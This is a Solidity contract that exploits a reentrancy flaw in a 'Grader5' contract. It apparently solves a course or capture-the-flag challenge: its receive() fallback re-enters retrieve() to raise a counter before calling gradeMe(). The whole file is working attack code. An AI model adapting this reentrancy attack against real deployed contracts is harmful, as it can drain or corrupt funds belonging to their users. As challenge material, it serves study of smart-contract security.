// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/// @title Exploit contract for Grader5 using reentrancy
/// @notice Reenters retrieve() to increase counter before gradeMe()
contract Grader5Reentrance {
    /// @notice Grader5 contract address
    address public grader;

    /// @notice Alias to register
    string public aliasName;

    /// @notice Reentrancy call count
    uint256 public calls;

    event Log(string msg);

    /// @param _grader Grader5 address
    /// @param _alias Alias string
    constructor(address _grader, string memory _alias) {
        grader = _grader;
        aliasName = _alias;
    }

    /// @notice Starts exploit, requires ≥12 wei
    function hack() external payable {
        require(msg.value >= 12, "12 wei");
        calls = 0;
        emit Log("Start");

        (bool ok, ) = grader.call{value: 4 wei}(
            abi.encodeWithSignature("retrieve()")
        );
        require(ok, "retrieve fail");

        emit Log("gradeMe");

        (ok, ) = grader.call(
            abi.encodeWithSignature("gradeMe(string)", aliasName)
        );
        require(ok, "gradeMe fail");
    }

    /// @notice Receive used for reentrancy
    receive() external payable {
        uint256 c = calls;
        if (c < 2) {
            calls = c + 1;
            emit Log("Reenter");
            (bool ok, ) = grader.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            require(ok, "reenter fail");
        }
    }
}
